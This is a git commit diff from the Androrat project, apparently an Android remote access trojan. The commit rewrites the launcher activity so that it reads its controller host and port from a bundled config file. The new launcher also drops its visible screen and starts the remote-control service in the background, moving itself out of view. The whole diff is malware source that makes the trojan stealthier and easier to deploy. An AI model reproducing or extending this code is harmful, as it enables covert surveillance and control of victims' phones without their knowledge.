d13cc838a8b15ce1153c388b4c3455d767f3ca0b
wszfer <wszfer@gmail.com>
2014-02-23 00:38:31 +0800

    Add configuration for res

--- src/Androrat/gen/my/app/client/BuildConfig.java
+++
@@ -1,6 +0,0 @@
-/** Automatically generated file. DO NOT MODIFY */
-package my.app.client;
-
-public final class BuildConfig {
-    public final static boolean DEBUG = true;
-}
--- src/Androrat/src/my/app/client/LauncherActivity.java
+++ src/Androrat/src/my/app/client/LauncherActivity.java
@@ -1,5 +1,9 @@
 package my.app.client;
 
+import java.io.IOException;
+import java.io.InputStream;
+import java.util.Properties;
+
 import my.app.client.R;
 import android.app.Activity;
 import android.content.Context;
@@ -11,82 +15,69 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 
-public class LauncherActivity extends Activity {
-    /** Called when the activity is first created. */
-	
-	Intent Client, ClientAlt;
-	Button btnStart, btnStop;
-	EditText ipfield, portfield;
-	String myIp = "192.168.3.100"; //Put your IP in these quotes.
-	int myPort = 9999; //Put your port there, notice that there are no quotes here.
-	
-	@Override
-	public void onStart() {
-		super.onStart();
-		onResume();
-	}
-	
-	@Override
-	public void onResume() {
-		super.onResume();
-		setContentView(R.layout.main);
+public class LauncherActivity extends Activity
+	{
+		/** Called when the activity is first created. */
 
-        Client = new Intent(this, Client.class);
-        Client.setAction(LauncherActivity.class.getName());
-        
-        btnStart = (Button) findViewById(R.id.buttonstart);
-        btnStop = (Button) findViewById(R.id.buttonstop);
-        ipfield = (EditText) findViewById(R.id.ipfield);
-        portfield = (EditText) findViewById(R.id.portfield);
-        
-		if ( myIp == "" ) {
-			ipfield.setText("192.168.3.100");
-			portfield.setText("9999");
-			Client.putExtra("IP", ipfield.getText().toString());
-			Client.putExtra("PORT", Integer.parseInt(portfield.getText().toString()) );  
-        } else {
-			ipfield.setText(myIp);
-			portfield.setText(String.valueOf(myPort));
-			Client.putExtra("IP", myIp);
-			Client.putExtra("PORT", myPort );  
-		}
-        
-        
-        startService(Client);
-        btnStart.setEnabled(false);
-        btnStop.setEnabled(true);
-        moveTaskToBack(false);
-	}
-	
-    @Override
-    public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.main);
+		Intent Client, ClientAlt;
+		// Button btnStart, btnStop;
+		// EditText ipfield, portfield;
+		private String myIp = "127.0.0.1"; // Put your IP in these quotes.
+		private int myPort = 9999; // Put your port there, notice that there are no quotes here.
 
-        Client = new Intent(this, Client.class);
-        Client.setAction(LauncherActivity.class.getName());
-        
-        btnStart = (Button) findViewById(R.id.buttonstart);
-        btnStop = (Button) findViewById(R.id.buttonstop);
-        ipfield = (EditText) findViewById(R.id.ipfield);
-        portfield = (EditText) findViewById(R.id.portfield);
-        
-		if ( myIp == "" ) {
-			ipfield.setText("192.168.137.1");
-			portfield.setText("9999");
-			Client.putExtra("IP", ipfield.getText().toString());
-			Client.putExtra("PORT", Integer.parseInt(portfield.getText().toString()) );  
-        } else {
-			ipfield.setText(myIp);
-			portfield.setText(String.valueOf(myPort));
-			Client.putExtra("IP", myIp);
-			Client.putExtra("PORT", myPort );  
-		}
-        
-        
-        startService(Client);
-        btnStart.setEnabled(false);
-        btnStop.setEnabled(true);
-        //moveTaskToBack(true);
-    }
-}
+		@Override
+		public void onStart()
+			{
+				super.onStart();
+				onResume();
+			}
+
+		@Override
+		public void onResume()
+			{
+				super.onResume();
+				Client = new Intent(this, Client.class);
+				Client.setAction(LauncherActivity.class.getName());
+				getConfig();
+				Client.putExtra("IP", myIp);
+				Client.putExtra("PORT", myPort);
+
+				startService(Client);
+				moveTaskToBack(true);
+			}
+
+		@Override
+		public void onCreate(Bundle savedInstanceState)
+			{
+				super.onCreate(savedInstanceState);
+//				setContentView(R.layout.main);
+				Client = new Intent(this, Client.class);
+				Client.setAction(LauncherActivity.class.getName());
+				getConfig();
+				Client.putExtra("IP", myIp);
+				Client.putExtra("PORT", myPort);
+
+				startService(Client);
+				//moveTaskToBack(true);
+			}
+		/**
+		 * get Config
+		 */
+		private void getConfig()
+			{
+				Properties pro = new Properties();
+				InputStream is = getResources().openRawResource(R.raw.config);
+				try
+					{
+						pro.load(is);
+					} catch (IOException e)
+					{
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+				myIp = pro.getProperty("host");
+				myPort = Integer.valueOf(pro.getProperty("prot"));
+				System.out.println(myIp);
+				System.out.println(myPort);
+			}
+	}
